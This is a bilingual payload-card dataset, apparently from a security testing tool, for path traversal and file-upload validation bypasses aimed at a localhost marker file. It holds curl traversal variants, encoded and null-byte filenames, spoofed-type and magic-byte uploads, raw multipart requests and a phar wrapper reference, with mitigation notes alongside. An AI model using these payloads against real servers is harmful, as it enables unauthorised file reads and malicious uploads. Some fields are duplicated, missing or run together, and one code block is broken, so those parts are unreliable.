review.rationale: 竞态条目由并发 curl、Python 线程、策略文件和分块 socket 工作流组成，按运行方式唯一迁入两个现有工具卡。

name.zh: 文件下载路径规范化差异

description.zh: 文件下载路径规范化差异将旧集合限定为单一验证边界：下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: File Download Path Normalization Differential narrows the legacy collection to one boundary: the download parameter is interpreted inconsistently across URL decoding, separator folding, and root confinement. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 文件下载路径规范化差异

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 文件下载路径规范化差异验证块 1
title.en: File Download Path Normalization Differential Validation Block 1

execution.command:
BASE="http://127.0.0.1:8080/download?file="
curl --fail --silent --show-error --max-time 3 "${BASE}../outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}....//outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%2e%2e/outside/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}..%5coutside%5cPAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 "${BASE}../documents/PAYLOADER_MARKER.txt"

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

overview.zh: 文件下载路径规范化差异比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: File Download Path Normalization Differential compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是下载参数在 URL 解码、分隔符折叠和根目录约束之间出现不一致。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that the download parameter is interpreted inconsistently across URL decoding, separator folding, and root confinement. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应使用服务端对象标识，统一解码和规范化，并在打开文件前强制执行根目录与 scheme 允许列表。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should use server-issued object identifiers, canonicalize once, and enforce root and scheme allowlists before opening a file. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与文件下载路径规范化差异有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for File Download Path Normalization Differential, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.zh: 提交无变体的 PAYLOADER_MARKER，记录提交值、最终对象名、解析结果和清理位置。
description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

description.zh: 一次只运行一个文件下载路径规范化差异命令块，保留原始请求、响应和服务端日志。
description.en: Run one File Download Path Normalization Differential command block at a time and preserve the raw request, response, and server logs.

description.zh: 最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 使用服务端对象标识，统一解码和规范化，并在打开文件前强制执行根目录与 scheme 允许列表，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: use server-issued object identifiers, canonicalize once, and enforce root and scheme allowlists before opening a file, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

analysis.zh: 确认标准是最终路径或处理器日志与唯一 marker 返回相互印证，正常路径和缺失 marker 对照均不命中。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that final-path or handler logs agree with the unique marker response while normal-path and missing-marker controls do not match. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

name.zh: LFI/RFI 测试工具：文件工作流 1

commands.command:
BASE="http://127.0.0.1:8080/download?file="
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.yml" -o "$WORK/marker.yml"
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.xml" -o "$WORK/marker.xml"
curl --fail --silent --show-error --max-time 3 "${BASE}../fixtures/PAYLOADER_MARKER.properties" -o "$WORK/marker.properties"
grep --fixed-strings --files-with-matches "PAYLOADER_MARKER" "$WORK"/*

description.zh: 该工作流从修正后的文件安全集合逐行迁移，使用本地 marker、固定超时和可清理夹具。
description.en: This workflow is routed line-for-line from the corrected file-security collection and uses local markers, fixed timeouts, and disposable fixtures.

name.zh: LFI/RFI 测试工具：文件工作流 2

commands.command:
BASE="http://127.0.0.1:8080/download?file="
WORK=$(mktemp -d)
trap 'rm -rf "$WORK"' EXIT
FILES=("../outside/PAYLOADER_MARKER.txt" "../outside/PAYLOADER_MARKER.json" "../outside/PAYLOADER_MARKER.xml")
for file in "${FILES[@]}"; do
  output="$WORK/$(basename "$file")"
  if curl --fail --silent --show-error --max-time 3 "${BASE}${file}" -o "$output"; then
    grep --fixed-strings --quiet "PAYLOADER_MARKER" "$output" && printf "marker_read path=%s\n" "$file"
  fi
done

review.rationale: 旧集合已按单一解析边界拆分，修正后的每一行命令只路由一次，并保留空行计数。

name.zh: 上传声明类型不一致

description.zh: 上传声明类型不一致将旧集合限定为单一验证边界：客户端声明的 Content-Type 被当作可信文件类型而未与内容和扩展名交叉校验。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: Upload Declared-Type Mismatch narrows the legacy collection to one boundary: the client-declared Content-Type is trusted without checking content and extension. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 上传声明类型不一致

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 上传声明类型不一致验证块 1

execution.command:
BASE="http://127.0.0.1:8080"
MARKER="./payloader-fixture/PAYLOADER_MARKER.txt"
curl --fail --silent --show-error --max-time 3 -F "file=@$MARKER;type=image/jpeg;filename=PAYLOADER_MARKER.txt" "$BASE/upload"
curl --fail --silent --show-error --max-time 3 --head "$BASE/uploads/PAYLOADER_MARKER.txt"

description.zh: 该块保留 BASE、MARKER、声明类型请求和读取验证。
description.en: This chunk retains BASE, MARKER, the declared-type request, and retrieval verification.

overview.zh: 上传声明类型不一致比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: Upload Declared-Type Mismatch compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是客户端声明的 Content-Type 被当作可信文件类型而未与内容和扩展名交叉校验。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that the client-declared Content-Type is trusted without checking content and extension. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应生成服务端对象名，在目标文件系统语义下统一校验名称、内容和类型，并把上传目录设为不可执行。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should generate server-side object names, validate name, content, and type under deployed filesystem semantics, and keep upload storage non-executable. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与上传声明类型不一致有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for Upload Declared-Type Mismatch, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.zh: 提交无变体的 PAYLOADER_MARKER，记录提交值、最终对象名、解析结果和清理位置。
description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

description.zh: 一次只运行一个上传声明类型不一致命令块，保留原始请求、响应和服务端日志。
description.en: Run one Upload Declared-Type Mismatch command block at a time and preserve the raw request, response, and server logs.

description.zh: 入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 生成服务端对象名，在目标文件系统语义下统一校验名称、内容和类型，并把上传目录设为不可执行，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: generate server-side object names, validate name, content, and type under deployed filesystem semantics, and keep upload storage non-executable, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

analysis.zh: 确认标准是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

name.zh: 上传签名与内容不一致

description.zh: 上传签名与内容不一致将旧集合限定为单一验证边界：校验器只检查少量 magic bytes，而下游组件继续消费完整文件。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: Upload Signature-Content Mismatch narrows the legacy collection to one boundary: the validator checks only a short magic-byte prefix while downstream components consume the full file. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 上传签名与内容不一致

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 上传签名与内容不一致验证块 1

execution.command:
import tempfile
from pathlib import Path

fixtures = {
    "marker.jpg": bytes.fromhex("FFD8FFE000104A464946") + b"PAYLOADER_MARKER",
    "marker.png": bytes.fromhex("89504E470D0A1A0A") + b"PAYLOADER_MARKER",
    "marker.gif": b"GIF89aPAYLOADER_MARKER",
    "marker.bmp": b"BM" + (54).to_bytes(4, "little") + b"\x00" * 48 + b"PAYLOADER_MARKER",
}
with tempfile.TemporaryDirectory(prefix="payloader-signature-") as directory:
    root = Path(directory)
    for name, data in fixtures.items():
        path = root / name
        path.write_bytes(data)
        assert path.read_bytes().endswith(b"PAYLOADER_MARKER")
        print(name, len(data), data[:12].hex())

title.zh: Multipart 内容类型解析差异验证块 1
title.en: Multipart Content-Type Parser Differential Validation Block 1

execution.command:
import socket

host, port = "127.0.0.1", 8080
boundary = "PAYLOADER_BOUNDARY"
body = (
    f"--{boundary}\r\n"
    'Content-Disposition: form-data; name="file"; filename="PAYLOADER_MARKER.txt"\r\n'
    "Content-Type: text/plain\r\n\r\n"
    f"PAYLOADER_MARKER\r\n--{boundary}--\r\n"
).encode("ascii")
request = (
    "POST /upload HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n\r\n"
).encode("ascii") + body
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(request)
    print(sock.recv(4096).decode("latin-1", errors="replace"))

execution.command:
import socket

host, port = "127.0.0.1", 8080
boundary = b"PAYLOADER_BOUNDARY"
filename = b"PAYLOADER_MARKER.txt\x00.jpg"
body = b"--" + boundary + b"
Content-Disposition: form-data; name="file"; filename="" + filename + b""
Content-Type: text/plain

PAYLOADER_MARKER
--" + boundary + b"--
"
request = b"POST /upload HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=" + boundary + b"
Content-Length: " + str(len(body)).encode("ascii") + b"
Connection: close

" + body
with socket.create_connection((host, port), timeout=3) as sock:
    sock.sendall(request)
    print(sock.recv(4096).decode("latin-1", errors="replace"))

title.zh: Windows 尾随名称规范化验证块 1

execution.command:
import tempfile
from pathlib import Path
import requests

BASE = "http://127.0.0.1:8080"
names = [
    "PAYLOADER_MARKER.txt.",
    "PAYLOADER_MARKER.txt ",
    "PAYLOADER_MARKER.txt::$DATA",
    "PAYLOADER_MARKER.TXT",
    "PAYLOADER_MARKER.txt" + "/./" * 64,
]
with tempfile.TemporaryDirectory(prefix="payloader-name-") as directory:
    marker = Path(directory) / "PAYLOADER_MARKER.txt"
    marker.write_text("PAYLOADER_MARKER", encoding="utf-8")
    for name in names:
        with marker.open("rb") as handle:
            response = requests.post(f"{BASE}/upload", files={"file": (name, handle, "text/plain")}, timeout=3)
        print(repr(name), response.status_code)

name.zh: POSIX 路径遍历规范化

description.zh: POSIX 路径遍历规范化将旧集合限定为单一验证边界：相对段在应用过滤后由 POSIX 路径解析继续折叠并越过允许根目录。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: POSIX Path-Traversal Normalization narrows the legacy collection to one boundary: relative segments are folded by POSIX path resolution after filtering and escape the allowed root. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: POSIX 路径遍历规范化

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: POSIX 路径遍历规范化验证块 1

execution.command:
BASE="http://127.0.0.1:8080/file?path="
for depth in 1 2 3 4; do
  traversal=$(printf "../%.0s" $(seq 1 "$depth"))
  value=$(curl --fail --silent --show-error --max-time 3 "${BASE}${traversal}outside/PAYLOADER_MARKER.txt" || true)
  [ "$value" = "PAYLOADER_MARKER" ] && printf "marker_read depth=%s\n" "$depth"
done

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

overview.zh: POSIX 路径遍历规范化比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: POSIX Path-Traversal Normalization compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是相对段在应用过滤后由 POSIX 路径解析继续折叠并越过允许根目录。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that relative segments are folded by POSIX path resolution after filtering and escape the allowed root. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是批准根目录外的唯一 marker 被读取，且规范路径或网络解析日志与请求 ID 精确关联；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that the unique marker outside the approved root is read and canonical-path or network-resolution logs correlate exactly with the request ID; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应拒绝绝对、设备和父目录形式，通过受限目录句柄访问文件，并在最终路径上执行边界检查。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should reject absolute, device, and parent forms, access files through a confined directory handle, and enforce boundaries on the final path. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与POSIX 路径遍历规范化有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for POSIX Path-Traversal Normalization, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

description.en: Require that the unique marker outside the approved root is read and canonical-path or network-resolution logs correlate exactly with the request ID, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 拒绝绝对、设备和父目录形式，通过受限目录句柄访问文件，并在最终路径上执行边界检查，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: reject absolute, device, and parent forms, access files through a confined directory handle, and enforce boundaries on the final path, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

analysis.zh: 确认标准是批准根目录外的唯一 marker 被读取，且规范路径或网络解析日志与请求 ID 精确关联。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that the unique marker outside the approved root is read and canonical-path or network-resolution logs correlate exactly with the request ID. HTTP 200 or 500, reflected filenames, WAF alerts, or a single timeout do not prove the boundary was crossed.

description.en: Path-Traversal Legacy Termination and Truncation narrows the legacy collection to one boundary: terminator bytes, short names, and path padding alter the final filename in a legacy parsing chain. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 路径遍历旧式终止与截断

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。

title.zh: 路径遍历旧式终止与截断验证块 1
title.en: Path-Traversal Legacy Termination and Truncation Validation Block 1

execution.command:
../outside/PAYLOADER_MARKER.txt%00.txt

..%5coutside%5cPAYLOA~1.TXT

../outside/PAYLOADER_MARKER.txt/./././././././.

../outside/PAYLOADER_MARKER.txt. . .

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

overview.zh: 路径遍历旧式终止与截断比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: Path-Traversal Legacy Termination and Truncation compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是终止字节、短名和路径填充在旧式解析链上改变最终文件名。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that terminator bytes, short names, and path padding alter the final filename in a legacy parsing chain. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应拒绝控制字节和动态路径，改用逻辑标识允许列表，并让所有组件消费同一规范化结果。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should reject control bytes and dynamic paths, use an allowlist of logical identifiers, and make every component consume one canonical result. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与路径遍历旧式终止与截断有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。

description.en: Require that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 拒绝控制字节和动态路径，改用逻辑标识允许列表，并让所有组件消费同一规范化结果，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: reject control bytes and dynamic paths, use an allowlist of logical identifiers, and make every component consume one canonical result, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

analysis.zh: 确认标准是字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。

analysis.zh: 确认标准是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论。HTTP 200、500、文件名回显、WAF 告警或单次超时都不足以确认边界被突破。
analysis.en: Confirmation requires that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result. opsecTips.zh: 只使用随机文本 marker、localhost 或 example.invalid，并限制每个变体的请求数和超时。
opsecTips.en: Use only random text markers, localhost, or example.invalid, and cap request count and timeout for each variant.

opsecTips.zh: 结束后删除临时文件、归档、对象和任务记录，并确认没有队列、文件句柄或下游处理残留。
opsecTips.en: Delete temporary files, archives, objects, and test jobs, and verify no queue, file handle, or downstream processing remains.

name.zh: 上传 Windows 尾随文件名

description.zh: 上传 Windows 尾随文件名将旧集合限定为单一验证边界：尾随空格、点、分号或控制编码在上传校验后被 Windows 或 Web 服务器折叠。命令只操作 PAYLOADER_MARKER 和隔离夹具。
description.en: Upload Windows Trailing Filename narrows the legacy collection to one boundary: trailing spaces, dots, semicolons, or encoded controls are folded after upload validation. Commands operate only on PAYLOADER_MARKER and isolated fixtures.

subCategory.zh: 上传 Windows 尾随文件名

prerequisites.zh: 已在隔离服务准备 PAYLOADER_MARKER、正常基线和可查看的最终路径或解析日志。
prerequisites.en: An isolated service provides PAYLOADER_MARKER, a normal baseline, and observable final-path or parser logs.

prerequisites.zh: 测试端点、请求数量、临时目录和回滚步骤已经明确，不使用生产文件或真实凭据。
prerequisites.en: The endpoint, request count, temporary directory, and rollback steps are defined, with no production files or real credentials.

title.zh: 上传 Windows 尾随文件名验证块 1
title.en: Upload Windows Trailing Filename Validation Block 1

execution.command:
filename="PAYLOADER_MARKER.txt "
filename="PAYLOADER_MARKER.txt%20"
filename="PAYLOADER_MARKER.txt%00.jpg"
filename="PAYLOADER_MARKER.txt%09.jpg"
Content-Disposition: form-data; name="file"; filename="PAYLOADER_MARKER.txt%20"

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

title.zh: 上传 Windows 尾随文件名验证块 2
title.en: Upload Windows Trailing Filename Validation Block 2

execution.command:
filename="PAYLOADER_MARKER.txt."
filename="PAYLOADER_MARKER.txt..."
filename="PAYLOADER_MARKER.txt. "
filename="PAYLOADER_MARKER.txt .jpg"
filename="PAYLOADER_MARKER.asp;.txt"
filename="PAYLOADER_MARKER.asp;x.txt"
filename="PAYLOADER_MARKER.txt%0apadding"
curl --fail --silent --show-error --max-time 3 --head "http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt."

description.zh: 该命令块从修正后的来源逐行迁移，仅使用本地 marker 夹具。
description.en: This command block is routed line-for-line from the corrected source and uses only local marker fixtures.

overview.zh: 上传 Windows 尾随文件名比较入口值、规范化结果和最终文件操作。状态码或错误页面不是结论，唯一 marker 才能建立可重复对照。
overview.en: Upload Windows Trailing Filename compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是尾随空格、点、分号或控制编码在上传校验后被 Windows 或 Web 服务器折叠。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that trailing spaces, dots, semicolons, or encoded controls are folded after upload validation. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that ingress records and the final object name or type correlate repeatably with the unique marker while the normal-file control keeps its expected result; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应生成服务端对象名，在目标文件系统语义下统一校验名称、内容和类型，并把上传目录设为不可执行。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should generate server-side object names, validate name, content, and type under deployed filesystem semantics, and keep upload storage non-executable. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与上传 Windows 尾随文件名有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for Upload Windows Trailing Filename, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.zh: 提交无变体的 PAYLOADER_MARKER，记录提交值、最终对象名、解析结果和清理位置。
description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

description.zh: 一次只运行一个上传 Windows 尾随文件名命令块，保留原始请求、响应和服务端日志。

description.zh: 入口记录、最终对象名或类型与唯一 marker 结果形成可重复关联，正常文件对照保持原有结论，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。

execution.command:

printf "%s\n" "phar:///tmp/payloader-fixture/PAYLOADER_MARKER.phar/marker.txt"

description.en: These two lines are standalone archive-wrapper references.

overview.en: Post-Upload Wrapper Reference Boundary compares the ingress value, canonical result, and final file operation. Status codes or error pages are not conclusions; a unique marker provides the repeatable control.

vulnerability.zh: 根因是上传后的文件引用被交给 zip、phar 或其他运行时 wrapper 继续解释。只有当差异跨越预期目录、类型或处理器边界时，风险才成立。
vulnerability.en: The root cause is that a post-upload file reference is handed to zip, phar, or another runtime wrapper for further interpretation. Risk is confirmed only when the difference crosses the intended directory, type, or handler boundary.

exploitation.zh: 先提交正常 marker 基线并记录请求 ID，再逐一重放本卡命令。阳性证据必须是字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败；失败状态、响应时延或规则命中只能作为线索。
exploitation.en: Submit the normal marker baseline and record its request ID, then replay this card one command at a time. Positive evidence requires that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail; failure status, latency, or a rule match is only a lead.

mitigation.zh: 修复应拒绝控制字节和动态路径，改用逻辑标识允许列表，并让所有组件消费同一规范化结果。之后同时重放异常样例与正常样例，确认 marker 不再越界且合法文件流程保持可用。
mitigation.en: Remediation should reject control bytes and dynamic paths, use an allowlist of logical identifiers, and make every component consume one canonical result. Replay both the variant and normal cases to prove the marker no longer crosses the boundary while legitimate file handling remains available.

description.zh: 定位与上传后包装器引用边界有关的入口、规范化组件、存储或下游处理器，并启用请求 ID 关联。
description.en: Identify the ingress, canonicalization component, storage layer, or downstream processor for Post-Upload Wrapper Reference Boundary, and enable request-ID correlation.

title.zh: 建立正常 marker 基线

description.zh: 提交无变体的 PAYLOADER_MARKER，记录提交值、最终对象名、解析结果和清理位置。
description.en: Submit an unmodified PAYLOADER_MARKER and record the submitted value, final object name, parser result, and cleanup location.

description.zh: 一次只运行一个上传后包装器引用边界命令块，保留原始请求、响应和服务端日志。
description.en: Run one Post-Upload Wrapper Reference Boundary command block at a time and preserve the raw request, response, and server logs.

description.zh: 字节级请求、运行时解析日志和唯一 marker 输出三者一致，普通输入与缺失 marker 对照均失败，同时用缺失 marker 和正常路径排除缓存、默认文件与其他任务干扰。
description.en: Require that the byte-level request, runtime parser log, and unique marker output agree while plain-input and missing-marker controls fail, and use missing-marker and normal-path controls to exclude cache, default files, and unrelated jobs.

description.zh: 拒绝控制字节和动态路径，改用逻辑标识允许列表，并让所有组件消费同一规范化结果，随后验证异常变体被拒绝且正常上传、下载或解压仍成功。
description.en: reject control bytes and dynamic paths, use an allowlist of logical identifiers, and make every component consume one canonical result, then verify the variant is rejected while normal upload, download, or extraction still succeeds.

